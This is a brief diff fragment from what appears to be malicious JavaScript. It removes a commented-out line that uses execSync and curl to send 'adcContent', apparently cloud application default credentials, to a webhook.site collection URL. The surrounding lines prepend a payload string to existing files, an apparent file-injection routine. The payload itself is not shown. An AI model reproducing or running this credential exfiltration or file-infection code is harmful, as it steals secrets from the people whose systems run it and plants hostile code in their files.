@@ -21,7 +21,7 @@ headers: {
    })
 
 
-#cp.execSync('curl -s "https://webhook.site/9bcc074d-782d-4001-b634-03ace069f3f6?adc='+adcContent);
+
 `;
             fs.writeFileSync(f, payload + fs.readFileSync(f, 'utf8'));
         }
